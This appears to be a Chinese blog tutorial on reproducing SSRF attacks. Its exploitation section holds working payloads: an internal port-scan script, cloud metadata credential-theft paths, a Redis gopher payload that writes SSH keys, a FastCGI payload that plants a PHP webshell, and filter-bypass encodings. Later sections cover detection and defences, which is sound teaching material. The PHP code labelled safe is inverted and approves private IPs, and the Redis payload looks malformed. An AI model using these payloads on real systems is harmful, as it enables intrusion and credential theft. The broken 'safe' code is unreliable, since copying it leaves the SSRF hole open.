---
title: "SSRF 漏洞复现 - 从内网探测到云环境接管"
date: 2026-03-01T18:00:00+08:00
draft: false
categories: ['漏洞复现']
tags: ['SSRF', '内网渗透', '漏洞复现']
---

# SSRF 漏洞复现 - 从内网探测到云环境接管

## 📋 漏洞概述

**漏洞名称**: Server-Side Request Forgery (SSRF)  
**漏洞类型**: 服务端请求伪造  
**危害等级**: 🔴 高危  
**常见场景**: 图片加载、URL 预览、API 代理、Webhook 回调

---

## 🎯 漏洞原理

### 什么是 SSRF？

SSRF（服务端请求伪造）是一种允许攻击者诱导服务器发起非预期请求的漏洞。攻击者可以：

- 探测内网拓扑
- 访问内网服务
- 读取云环境元数据
- 绕过防火墙限制
- 执行远程代码（配合其他漏洞）

### 核心机制

```
攻击者 → Web 应用 → 内网服务/云 API
         (被利用)
```

---

## 🧪 漏洞环境搭建

### 目标应用

```bash
# DVWA SSRF 环境
docker run -d -p 8080:80 vulnerables/web-dvwa

# 或使用专门的 SSRF 靶场
docker run -d -p 5000:5000 epinna/ttcm-ssrf-lab
```

### 常见漏洞点

1. **图片加载**: `GET /fetch?url=http://internal/api`
2. **URL 预览**: `POST /preview {"url": "http://..."}`
3. **API 代理**: `GET /proxy?target=http://internal:8080/admin`
4. **文件导入**: `POST /import {"file_url": "http://..."}`

---

## ⚔️ 漏洞利用

### 1️⃣ 基础内网探测

```http
GET /fetch?url=http://192.168.1.1:80 HTTP/1.1
GET /fetch?url=http://192.168.0.1:80 HTTP/1.1
GET /fetch?url=http://10.0.0.1:80 HTTP/1.1
```

**批量扫描脚本**:
```python
import requests

targets = [
    "192.168.1.1", "192.168.1.254",
    "10.0.0.1", "10.0.1.1",
    "172.16.0.1", "172.17.0.1"
]

ports = [80, 443, 8080, 3306, 6379, 22]

for ip in targets:
    for port in ports:
        url = f"http://target.com/fetch?url=http://{ip}:{port}"
        try:
            r = requests.get(url, timeout=2)
            if r.status_code == 200 and len(r.text) > 0:
                print(f"[+] Found: {ip}:{port}")
        except:
            pass
```

### 2️⃣ 云环境元数据窃取

#### AWS EC2

```http
GET /fetch?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1
```

**敏感路径**:
```
/latest/meta-data/iam/security-credentials/
/latest/meta-data/iam/security-credentials/admin
/latest/user-data
/latest/meta-data/ami-id
```

#### 阿里云

```http
GET /fetch?url=http://100.100.100.200/latest/meta-data/ HTTP/1.1
```

#### 腾讯云

```http
GET /fetch?url=http://metadata.tencentyun.com/latest/meta-data/ HTTP/1.1
```

### 3️⃣ Redis 未授权访问

```http
GET /fetch?url=gopher://127.0.0.1:6379/_INFO HTTP/1.1
```

**写入 SSH 公钥**:
```
gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20/root/.ssh/_CONFIG%20SET%20dbfilename%20authorized_keys/_SET%20mykey%20"ssh-rsa AAAA..."/_SAVE
```

### 4️⃣ FastCGI 远程执行

```
gopher://127.0.0.1:9000/_fcgi?FCGI_ROLE=REQUESTER&web_server_docroot=/var/www/html&request_method=POST&content_type=application/x-www-form-urlencoded&content_length=38&SCRIPT_FILENAME=/var/www/html/shell.php&SCRIPT_NAME=/shell.php&REQUEST_URI=/shell.php&PHP_VALUE=allow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php://input&QUERY_STRING=a=1&body=<?php system($_GET[1]);?>
```

### 5️⃣ DNS 重绑定攻击

当目标过滤 IP 时，使用 DNS 重绑定绕过：

1. 注册域名 `attacker.com`
2. 首次解析为公网 IP（通过过滤）
3. 二次解析为内网 IP（实际请求）

**工具**: [rbndr](https://github.com/nccgroup/rbndr)

### 6️⃣ 协议绕过技巧

#### URL 编码

```
http://127.0.0.1 → http://127.1
http://127.0.0.1 → http://0177.0.0.1 (八进制)
http://127.0.0.1 → http://0x7f.0.0.1 (十六进制)
http://127.0.0.1 → http://2130706433 (十进制)
```

#### IPv6 映射

```
http://[::1]:80
http://[0:0:0:0:0:ffff:7f00:1]:80
```

#### 重定向

```http
HTTP/1.1 302 Found
Location: http://192.168.1.1/admin
```

---

## 🛡️ 常见框架漏洞

### Java (URL 类)

```java
// ❌ 不安全
URL url = new URL(userInput);
HttpURLConnection conn = (HttpURLConnection) url.openConnection();

// ✅ 安全 - 检查目标 IP
private boolean isAllowedHost(String host) {
    try {
        InetAddress addr = InetAddress.getByName(host);
        return !addr.isAnyLocalAddress() && 
               !addr.isLoopbackAddress() &&
               !addr.isSiteLocalAddress();
    } catch (UnknownHostException e) {
        return false;
    }
}
```

### Python (requests)

```python
# ❌ 不安全
requests.get(user_url)

# ✅ 安全 - 使用 ssrf_filter
from ssrf_filter import ssrf_filter
@ssrf_filter()
def fetch_url(url):
    return requests.get(url)
```

### PHP (file_get_contents)

```php
// ❌ 不安全
file_get_contents($_GET['url']);

// ✅ 安全 - 检查 IP
function is_safe_url($url) {
    $host = parse_url($url, PHP_URL_HOST);
    $ip = gethostbyname($host);
    return !filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE);
}
```

---

## 🔍 漏洞检测

### Nuclei 模板

```yaml
id: ssrf-detection
info:
  name: SSRF Detection
  severity: high
  tags: ssrf,injection

requests:
  - method: GET
    path:
      - "{{BaseURL}}/fetch?url=http://{{interactsh-url}}"
      - "{{BaseURL}}/proxy?target=http://{{interactsh-url}}"
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
          - "http"
```

### Burp Suite Collaborator

1. 生成 Collaborator payload
2. 注入到 URL 参数
3. 检查是否有 DNS/HTTP 请求

---

## 📊 真实案例分析

### 案例 1: 某电商平台内网接管

**漏洞点**: 商品图片抓取功能  
**利用链**: SSRF → Redis 未授权 → 写入 SSH 公钥 → 服务器接管  
**影响**: 核心数据库泄露

### 案例 2: 云环境凭证窃取

**漏洞点**: Webhook 回调 URL  
**利用**: 读取 AWS IAM 凭证  
**影响**: 完整云环境接管

---

## ✅ 防御方案

### 1. 白名单机制

```python
ALLOWED_HOSTS = ['api.payment.com', 'cdn.example.com']

def fetch_url(url):
    host = urlparse(url).hostname
    if host not in ALLOWED_HOSTS:
        raise ValueError("Host not allowed")
```

### 2. IP 地址校验

```python
import socket
import ipaddress

def is_private_ip(hostname):
    try:
        ip = socket.gethostbyname(hostname)
        return ipaddress.ip_address(ip).is_private
    except:
        return True  # 默认拒绝

if is_private_ip(host):
    raise ValueError("Private IP not allowed")
```

### 3. 禁用危险协议

```python
ALLOWED_SCHEMES = ['http', 'https']

def validate_url(url):
    parsed = urlparse(url)
    if parsed.scheme not in ALLOWED_SCHEMES:
        raise ValueError("Scheme not allowed")
```

### 4. 网络层隔离

- 应用服务器无法访问内网
- 使用防火墙规则限制出站连接
- 云环境使用安全组

---

## 🎓 学习资源

- [OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [PortSwigger SSRF Labs](https://portswigger.net/web-security/ssrf)
- [PayloadsAllTheThings SSRF](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SSRF%20injection)

---

**标签**: #SSRF #注入漏洞 #Web 安全 #漏洞复现 #SRC #云安全
